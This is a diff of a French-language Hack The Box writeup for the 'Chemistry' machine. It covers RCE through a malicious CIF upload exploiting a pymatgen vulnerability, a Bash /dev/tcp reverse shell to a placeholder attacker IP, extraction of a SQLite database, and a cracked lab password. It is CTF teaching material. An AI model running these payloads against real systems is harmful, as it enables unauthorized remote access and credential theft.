@@ -13,9 +13,9 @@ draft: true
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "Chemistry (HTB Easy) : RCE pymatgen, reverse shell, puis root via path traversal aiohttp."
-description: "Chemistry (HTB Easy) : RCE via upload CIF (CVE-2024-23346), reverse shell puis escalade root via path traversal aiohttp (CVE-2024-23334). Exploitation expliquée pas à pas."
-tags: ["HTB Easy","Hack The Box","Web","RCE","Path Traversal","pymatgen","aiohttp","CVE-2024-23346","CVE-2024-23334"]
+summary: "Chemistry (HTB Easy) : RCE via pymatgen, reverse shell puis root via path traversal aiohttp."
+description: "Writeup de Chemistry (HTB Easy) : exploitation d’une RCE via upload CIF (CVE-2024-23346), reverse shell puis escalade jusqu’à root via un path traversal sur aiohttp (CVE-2024-23334)."
+tags: ["HTB Easy","web","rce","path-traversal","pymatgen","aiohttp","cve-2024-23346","cve-2024-23334"]
 categories: ["Mes writeups"]
 
 # --- TOC & mise en page ---
@@ -26,7 +26,7 @@ TocOpen: true
 # --- Cover / images (Page Bundle) ---
 cover:
   image: "image.png"
-  alt: "Machine Chemistry HTB Easy exploitée via RCE pymatgen puis path traversal aiohttp jusqu’à l’accès root"
+  alt: "Machine Chemistry HTB Easy exploitée étape par étape : RCE pymatgen, reverse shell puis escalade root via path traversal aiohttp"
   caption: ""
   relative: true
   hidden: false
@@ -39,7 +39,7 @@ ctf:
   machine: "Chemistry"
   difficulty: "Easy"
   target_ip: "10.129.x.x"
-  skills: ["Enumeration","Web Exploitation","Reverse Shell","Privilege Escalation"]
+  skills: ["Enumeration","Web","RCE","Reverse Shell","Privilege Escalation"]
   time_spent: "2h"
   # vpn_ip: "10.10.14.xx"
   # notes: "Points d'attention…"
@@ -122,18 +122,19 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-La machine **Chemistry** de Hack The Box propose un scénario d’exploitation progressif centré sur l’analyse de fichiers scientifiques.
- Derrière une application web apparemment anodine — un analyseur de fichiers CIF (Crystallographic Information File) — se cache une vulnérabilité critique de type **Remote Code Execution** affectant la bibliothèque Python *pymatgen* (CVE-2024-23346).
+La machine **Chemistry** de Hack The Box repose sur un scénario d’exploitation progressif centré sur le traitement de fichiers scientifiques.
 
-Dans ce writeup, tu verras comment :
+L’application web proposée permet d’analyser des fichiers CIF (*Crystallographic Information File*).
+Derrière cette fonctionnalité apparemment anodine se cache une vulnérabilité critique de type **Remote Code Execution** dans la bibliothèque Python *pymatgen* (CVE-2024-23346).
 
-- exploiter une RCE via upload de fichier CIF,
-- obtenir un reverse shell sur le serveur,
-- pivoter vers un utilisateur valide grâce à l’analyse d’une base SQLite,
-- puis identifier et exploiter un service interne vulnérable à un **path traversal (CVE-2024-23334)** pour compromettre entièrement la machine.
+Dans ce writeup, tu vas voir comment :
 
-L’enchaînement est logique, méthodique et met en évidence un point essentiel en sécurité offensive :
- une simple vulnérabilité applicative peut, lorsqu’elle est combinée à une mauvaise isolation des services internes, conduire à une compromission totale du système.
+- exploiter une RCE via l’upload d’un fichier CIF malveillant,
+- obtenir un reverse shell sur la machine,
+- récupérer des credentials à partir d’une base SQLite,
+- puis exploiter un service interne vulnérable à un **path traversal (CVE-2024-23334)** pour obtenir un accès root.
+
+Cette machine illustre parfaitement une situation classique : une vulnérabilité web initiale, combinée à un service interne mal isolé, permet d’aboutir à une compromission complète du système.
 
 ---
 
@@ -437,39 +438,28 @@ Port 5000 (http)
 
 ## Prise pied
 
-Les énumérations n’ont révélé qu’une surface d’attaque très limitée :
+Les énumérations montrent une surface d’attaque très limitée :
 
-```
+```bash
 22/tcp   open  ssh
 5000/tcp open  http
 ```
 
-Pas de CMS détecté.
-Pas de service UDP exploitable.
-Pas de sous-domaines.
+Aucun CMS détecté, aucun service secondaire exploitable, aucun sous-domaine.
 
-Autrement dit, aucun vecteur évident côté réseau.
-
-La seule cible réellement exploitable est donc l’application web locale accessible sur chemistry.htb:5000.
-
-Tu te concentres donc entièrement sur cette application, qui constitue désormais ton unique point d’entrée.
+L’application web accessible sur `chemistry.htb:5000` devient donc l’unique point d’entrée.
 
 
 
 ![page index du site](cif-analyzer-5000.png)
 
-Traduction :
-
-> Bienvenue sur le Chemistry CIF Analyzer.
->  Cet outil te permet d’uploader un fichier CIF (Crystallographic Information File) et d’analyser les données structurelles qu’il contient.
-
 Un fichier **CIF** (Crystallographic Information File) est un format utilisé en chimie et en cristallographie pour décrire la structure atomique d’un matériau (coordonnées, paramètres de maille, symétrie, etc.).
 
 Autrement dit, l’application :
 
-1. Attend un fichier `.cif`
-2. L’analyse côté serveur
-3. Affiche les données structurelles extraites
+1. attend un fichier `.cif`
+2. l’analyse côté serveur
+3. affiche les données structurelles extraites
 
 En explorant manuellement l’interface web, tu retrouves clairement un mécanisme structuré autour de :
 
@@ -480,66 +470,64 @@ En explorant manuellement l’interface web, tu retrouves clairement un mécanis
 
 Le fonctionnement est simple :
 
-tu crées un compte
+- tu crées un compte
 
-![ tu crées un compte](register.png)
+![tu crées un compte](register.png)
 
-tu t’authentifies![tu t’authentifies](login.png)
+- tu t’authentifies
 
-tu uploades un fichier CIF
+![tu t’authentifies](login.png)
+
+- tu uploades un fichier CIF
 
 > Le site fournit d’ailleurs un fichier **exemple.cif**, destiné à démontrer le fonctionnement du mécanisme d’upload et d’affichage.
 
 ![tu uploades un fichier](upload-exemple-cif.png)
 
-puis tu peux le visualiser
+- puis tu peux le visualiser
 
 ![puis tu peux le visualiser](view-delete.png)
 
-et tu vois les données contenues dans le fichier CIF
+- tu accèdes aux données contenues dans le fichier CIF
 
 ![vue des data du cif](view-cif-data.png)
 
-Cela confirme que les fichiers CIF sont bien traités côté serveur lors du *view*.
+Cela confirme que le fichier est traité côté serveur au moment du *view*.
 
-En contexte CTF, un schéma upload → view est toujours un point d’attention.
+**Ce point est essentiel.**
 
-**Le véritable enjeu n’est pas l’upload lui-même, mais le traitement du fichier lors du view.**  
-Si l’application parse ou interprète le contenu du CIF à ce moment-là, en concevant un fichier malveillant, tu peux tenter de déclencher un comportement imprévu côté serveur.
+L’upload seul ne présente généralement pas de risque.
 
-**La stratégie devient alors claire : détourner ce mécanisme de traitement pour provoquer une exécution de code… et, idéalement, obtenir un reverse shell.**
+En revanche, **le traitement du fichier côté serveur constitue souvent une surface d’attaque critique**.
+
+Si le contenu du fichier est interprété ou parsé dynamiquement, un fichier malveillant peut permettre d’injecter du code et de déclencher une exécution côté serveur.
+
+La stratégie devient donc claire : **cibler le mécanisme de parsing du fichier CIF pour provoquer une exécution de code**.
 
 
 
 ### Hypothèse sur le parseur utilisé
 
-Avant de créer un fichier malveillant, tu dois comprendre **comment le fichier est traité côté serveur**.
+Avant de créer un fichier malveillant, tu dois comprendre comment le fichier CIF est traité côté serveur.
 
-Plusieurs indices orientent vers un backend Python :
+L’application semble reposer sur un backend Python, ce qui est cohérent avec :
 
-- L’application semble légère et minimaliste (ce qui correspond bien à une application développée avec un micro-framework Python comme Flask).
-- Le domaine scientifique (cristallographie, structures atomiques) est très fortement lié à l’écosystème Python.
-- En science des matériaux, la bibliothèque la plus répandue pour manipuler des fichiers CIF est **pymatgen**.
+- le type d’application (web léger)
+- le domaine scientifique (cristallographie)
+- l’utilisation de fichiers CIF
 
-Une recherche rapide sur les parsers CIF en Python montre que le module le plus utilisé et le plus robuste est :
+Dans cet écosystème, la bibliothèque la plus couramment utilisée pour parser des fichiers CIF est **pymatgen**, via le module :
 
 
-> ```
+> ```python
 > pymatgen.io.cif.CifParser
 > ```
 
+À ce stade, l’hypothèse la plus probable est donc que l’application utilise **pymatgen** pour analyser les fichiers lors du *view*.
 
-La bibliothèque **pymatgen** est largement employée dans les environnements académiques et scientifiques pour analyser des structures cristallines.
+Cette étape est importante : identifier la technologie utilisée permet de cibler directement des vulnérabilités connues.
 
-Il est donc hautement probable que l’application chemistry.htb s’appuie sur **pymatgen** pour parser les fichiers CIF lors du *view*.
-
-Si c’est le cas, toute vulnérabilité affectant ce parser pourrait être exploitable via un fichier CIF spécialement conçu.
-
-La suite consiste donc à rechercher d’éventuelles vulnérabilités connues sur pymatgen.
-
-En CTF, identifier la technologie utilisée en backend permet souvent de cibler directement des vulnérabilités connues.
-
-
+La suite consiste donc à rechercher des vulnérabilités affectant pymatgen.
 
 ------
 
@@ -551,21 +539,21 @@ En recherchant des vulnérabilités liées au parsing de fichiers CIF en Python,
 
 **CVE-2024-23346 — Pymatgen Remote Code Execution (RCE)**
 
-Cette vulnérabilité affecte certaines versions de la bibliothèque Python `pymatgen` et permet l’exécution de code arbitraire lors du parsing d’un fichier CIF spécialement conçu.
+Une recherche ciblée sur les parsers CIF en Python met rapidement en évidence une vulnérabilité critique :
 
-Dans le contexte de la machine HTB *Chemistry*, cela correspond exactement au mécanisme observé :
+**CVE-2024-23346 — Pymatgen Remote Code Execution**
 
-upload d’un fichier CIF → traitement serveur → affichage (*view*)
+Cette faille permet l’exécution de code arbitraire lors du parsing d’un fichier CIF spécialement conçu.
 
-Autrement dit, la prise de pied repose sur une **RCE via upload CIF exploitant pymatgen (CVE-2024-23346)**.
+Dans le contexte de l’application Chemistry, cela correspond exactement au comportement observé :
 
-Pour confirmer que cette vulnérabilité est exploitable dans le contexte de la machine, tu consultes l’advisory officiel associé à la CVE.
+\- upload d’un fichier
+\- traitement côté serveur
+\- affichage des données (*view*)
 
-La fiche [GitHub Security Advisory (GHSA-vgv8-5cpj-qj2f)](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f), identifiée via une recherche Google ciblée, fournit un Proof of Concept complet sous la forme d’un fichier CIF malveillant nommé vuln.cif.
+Le vecteur d’attaque est donc clair : exploiter le parsing du fichier CIF pour déclencher une exécution de code.
 
-Tu vas donc utiliser ce PoC comme base de test afin de vérifier si l’application Chemistry est réellement vulnérable, avant de l’adapter à ton environnement.
-
-------
+Un PoC public est disponible dans l’[advisory GitHub Security Advisory](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f) associé à cette vulnérabilité. Il fournit un fichier CIF malveillant nommé `vuln.cif`, qui va servir de base pour valider l’exploitation sur la machine.
 
 ### Analyse du Proof of Concept (PoC)
 
@@ -573,16 +561,13 @@ En analysant le PoC, tu constates que la vulnérabilité repose sur une injectio
 
 Le parser pymatgen évalue dynamiquement certaines données du fichier, ce qui permet l’exécution de code arbitraire au moment du parsing.
 
-Le point clé est donc :
+Le payload est donc exécuté lors du *view*, et non lors de l’upload.
 
-Le payload est exécuté au moment du parsing du fichier, c’est-à-dire lors du view.
-
-Tu confirmes ainsi que le vecteur n’est pas l’upload en lui-même, mais bien le traitement du fichier.
+Le vecteur d’attaque est donc le traitement du fichier côté serveur.
 
 #### Le fichier vuln.cif
 
-Le PoC présenté dans l’article repose sur l’injection d’une transformation malveillante dans un fichier nommé vuln.cif.
-L’objectif est d’exécuter une commande de test — en l’occurrence touch pwned — afin de démontrer l’exécution de code lors du parsing.
+Le PoC repose sur un fichier CIF malveillant nommé `vuln.cif`, contenant une commande de test (`touch pwned`) pour valider l’exécution de code.
 
 Voici le fichier complet :
 
@@ -603,36 +588,27 @@ _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
 ```
 
-Il est important de comprendre que tout ne sert pas à l’exploitation.
+Tous les éléments du fichier ne participent pas à l’exploitation.
 
-La ligne réellement critique est :
+La ligne critique est :
 
-`_space_group_magn.transform_BNS_Pp_abc '...payload...`
+`_space_group_magn.transform_BNS_Pp_abc '...payload...'`
 
-Tout le reste du fichier sert à :
+Le reste du fichier sert uniquement à :
 
 - conserver une structure CIF valide
-- éviter que le parser rejette immédiatement le fichier
-- permettre à pymatgen d’atteindre la phase de transformation vulnérable
+- éviter le rejet par le parser
+- permettre à pymatgen d’atteindre la phase vulnérable
 
-Autrement dit, le fichier doit rester conforme au format CIF, mais l’injection se concentre uniquement dans le champ transform_BNS_Pp_abc.
-
-À l’intérieur des quotes, l’expression Python :
-
-- explore la hiérarchie interne des classes Python
-- récupère dynamiquement un importeur interne (BuiltinImporter)
-- charge le module os
-- appelle os.system()
-
-C’est cette évaluation dynamique qui permet l’exécution de la commande système.
+Le payload injecté dans ce champ permet d’exécuter une commande système côté serveur via `os.system()`.
 
 #### Test initial avec vuln.cif
 
-Après l’upload et le view de vuln.cif, l’application retourne une erreur 500 – Internal Server Error.
+Après l’upload et le *view* de `vuln.cif`, l’application retourne une erreur **500 – Internal Server Error**.
 
-Ce comportement est cohérent avec une exception déclenchée pendant l’analyse du fichier, ce qui suggère que le parser a bien atteint la zone vulnérable.
+Ce comportement est cohérent avec une exception déclenchée pendant l’analyse du fichier, ce qui indique que le parser atteint bien la zone vulnérable.
 
-Cependant, sans accès direct au système de fichiers, il est impossible de vérifier si le fichier pwned a réellement été créé.
+Cependant, sans accès direct au système de fichiers, il est impossible de vérifier si le fichier `pwned` a été créé.
 
 Il faut donc utiliser une commande produisant un effet observable depuis ta machine.
 
@@ -640,11 +616,15 @@ Il faut donc utiliser une commande produisant un effet observable depuis ta mach
 
 Pour confirmer l’exécution de code, tu modifies la commande injectée afin de générer un trafic réseau sortant vers ta machine Kali.
 
-Remplace la commande touch pwned par :
+Remplace :
 
-`ping -c 5 10.10.x.x` (10.10.x.x étant l'adresse de ton interface `tun0`)
+`touch pwned`
 
-Crée un fichier poc-ping.cif
+par :
+
+`ping -c 5 10.10.x.x` (adresse de ton interface `tun0`)
+
+Crée ensuite le fichier :
 
 ```bash
 nano poc-ping.cif
@@ -680,9 +660,9 @@ sudo tcpdump -ni tun0 icmp
 Via l’interface web :
 
 - uploade le fichier
-- clique sur view
+- clique sur `view`
 
-Tu constates que la commande ping est exécutée 5 fois avant l’affichage de l’erreur 500.
+Tu observes plusieurs requêtes ICMP :
 
 ```bash
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
@@ -692,7 +672,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 10:41:32.904025 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 2, length 64
 10:41:32.904039 IP 10.10.x.x > 10.129x.x: ICMP echo reply, id 2, seq 2, length 64
 10:41:33.905702 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 3, length 64
-10:41:33.905717 IP 10.10.x.x> 10.129x.x: ICMP echo reply, id 2, seq 3, length 64
+10:41:33.905717 IP 10.10.x.x > 10.129x.x: ICMP echo reply, id 2, seq 3, length 64
 10:41:34.908317 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 4, length 64
 10:41:34.908333 IP 10.10.x.x > 10.129x.x: ICMP echo reply, id 2, seq 4, length 64
 10:41:35.909620 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 5, length 64
@@ -705,48 +685,58 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 
 Le trafic ICMP confirme que la commande système a bien été exécutée côté serveur.
 
-L’erreur 500 n’est donc pas un échec : elle intervient après l’exécution du payload, lorsque le parsing se termine anormalement.
+L’erreur 500 intervient après l’exécution du payload et ne remet pas en cause l’exploitation.
 
 > Note : Limite le nombre de pings (ici 5) pour ne pas entrer dans une boucle infinie
 
 ### Obtention du reverse shell
 
-La preuve d’exécution de code étant confirmée via le ping, l’étape suivante consiste logiquement à transformer cette exécution en accès interactif.
+Après avoir confirmé l’exécution de code avec le PoC basé sur `ping`, l’étape suivante consiste à obtenir un shell interactif.
 
-Tu ne modifies pas la structure du fichier CIF.
- Tu changes uniquement la commande injectée dans os.system().
+Le payload est modifié pour lancer un reverse shell vers ta machine Kali.
 
-Au lieu de :
+#### Mise en écoute côté attaquant
 
-`system("ping -c 5 10.10.x.x")`
-
-tu injectes un payload de reverse shell, par exemple :
-
-`system("/bin/bash -c 'sh -i >& /dev/tcp/10.10.x.x/4444 0>&1'")`
-
-
-
-#### Préparation du listener
-
-Avant d’envoyer le fichier malveillant, tu dois impérativement préparer l’écoute côté Kali :
+Sur ta machine Kali :
 
 ```bash
 nc -lvnp 4444
 ```
 
-#### Création du fichier revshell.cif
+#### Adaptation du payload
 
-Sauvegarde le fichier sous le nom revshell.cif en conservant la structure CIF valide et en ne modifiant que la commande injectée.
+Remplace la commande ping précédente par un reverse shell Bash :
 
-Tu uploades ensuite le fichier via l’interface web, puis tu déclenches le view.
+```bash
+bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"
+```
+
+Crée un nouveau fichier CIF en intégrant ce payload :
+
+```bash
+nano poc-revshell.cif
+```
+
+(identique au PoC précédent, en remplaçant uniquement la commande ping par le reverse shell)
+
+#### Exploitation
+
+Via l’interface web :
+
+- uploade le fichier
+- clique sur *view*
+
+
 
 ![reverse shell](view-revshell-cif.png)
 
-Comme précédemment, une erreur 500 apparaît.
+Une connexion est alors reçue sur ton listener :
 
-Mais cette fois, la différence est visible côté Kali.
+```bash
+connect to [10.10.x.x] from (UNKNOWN) [10.129.x.x] xxxx
+```
 
-Tu obtiens immédiatement un shell interactif :
+Tu obtiens un shell sur la machine cible.
 
 ```bash
 app@chemistry:~$ whoami
@@ -757,17 +747,25 @@ app@chemistry:~$ pwd
 /home/app
 ```
 
-Le contexte confirme que :
+#### Stabilisation du shell
 
-- le code s’exécute avec les droits de l’utilisateur app
-- tu es positionné dans /home/app
-- Tu disposes désormais d’un accès interactif exploitable sur la machine.
+Le shell obtenu est basique. Pour améliorer le confort tu stabilises le shell avec la recette {{< recette "stabiliser-reverse-shell" >}}.
 
-À ce stade, tu stabilises le shell avec la recette {{< recette "stabiliser-reverse-shell" >}} afin d’obtenir un TTY propre.
+#### Post-exploitation — recherche de données sensibles
 
-#### Exploration post-exploitation
+Une fois le reverse shell obtenu en tant qu’utilisateur `app`, tu commences par explorer le système afin d’identifier des fichiers intéressants.
 
-Une fois le reverse shell obtenu, tu commences par une reconnaissance basique du système.
+#### Exploration du système
+
+Tu vérifies le répertoire courant :
+
+```bash
+pwd
+```
+
+```bash
+/home/app
+```
 
 Le listing du répertoire `/home` révèle immédiatement la présence de deux utilisateurs :
 
@@ -783,7 +781,7 @@ Deux utilisateurs apparaissent :
 - `app` (compte d’exécution de l’application)
 - `rosa` (utilisateur humain)
 
-Dans un contexte CTF, la présence d’un utilisateur distinct est immédiatement intéressante.
+Dans un contexte CTF, la présence d’un second utilisateur est immédiatement intéressante.
 
 #### Analyse du répertoire applicatif
 
@@ -814,13 +812,13 @@ app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
 
 L’application utilise donc une base SQLite locale.
 
-Dans un contexte web, cela signifie souvent :
+Dans un contexte web, cela implique généralement :
 
 - stockage des utilisateurs
 - stockage des mots de passe
 - stockage de données internes
 
-C’est un pivot potentiel vers une élévation de privilèges.
+Cela constitue un pivot potentiel vers une élévation de privilèges.
 
 #### Localisation du flag utilisateur
 
@@ -837,11 +835,10 @@ Résultat :
 ```
 
 Le flag appartient à `rosa`.
+
 Tu n’y as pas encore accès.
 
-**Il faut donc trouver un moyen de devenir rosa.**
-
-------
+Il faut donc trouver un moyen de devenir `rosa`.
 
 ### Localisation et analyse de `database.db`
 
@@ -855,7 +852,7 @@ find / -type f -iname "database.db" 2>/dev/null
 /home/app/instance/database.db
 ```
 
-Tu récupères ensuite la base sur ta machine Kali (recette {{< recette "copier-fichiers-kali" >}}) et tu l’analyses avec sqlite3 :
+Tu récupères ensuite la base sur ta machine Kali (recette {{< recette "copier-fichiers-kali" >}}), puis tu l’analyses avec sqlite3 :
 
 ```
 sqlite3 database.db
@@ -1021,47 +1018,45 @@ Stopped: Sat Feb 14 10:56:13 2026
 
 #### Crédentiels de Rosa
 
-Le résultat est :
+Le mot de passe est :
 
 **rosa:unicorniosrosados**
 
 ### Accès SSH et user.txt
 
-Dans beaucoup de CTF, le mot de passe extrait de la base fonctionne également pour SSH — il est donc logique de le tester
+Les identifiants récupérés sont testés directement depuis le shell obtenu.
 
 ```bash
-ssh rosa@chemistry.htb
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-rosa@chemistry.htb's password: 
-Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
-
-[...]
-
-rosa@chemistry:~$ 
+su rosa
 ```
 
-Une fois connecté en SSH avec le compte `rosa`, tu peux vérifier le contenu de son répertoire personnel :
+Mot de passe :
 
-```bash
-ls -l
-total 4
--rw-r----- 1 root rosa 33 Feb 17 10:23 user.txt
+```txt
+unicorniosrosados
 ```
 
-Le fichier `user.txt` apparaît immédiatement dans le dossier personnel.
-
-Il ne te reste plus qu’à l’afficher :
+L’authentification réussit :
 
 ```bash
-cat user.txt
+rosa@chemistry:~$ whoami
+rosa
+```
+
+Tu disposes maintenant d’un shell en tant que `rosa`.
+
+#### Récupération du flag utilisateur
+
+```bash
+cat /home/rosa/user.txt
 8acdxxxxxxxxxxxxxxxxxxxxxxxx4479
 ```
 
-**Tu récupères ainsi facilement le flag user.txt**
+Le flag utilisateur est récupéré avec succès.
 
+La prise de pied est complète.
 
+Tu peux maintenant passer à l’escalade de privilèges.
 
 ## Escalade de privilèges
 
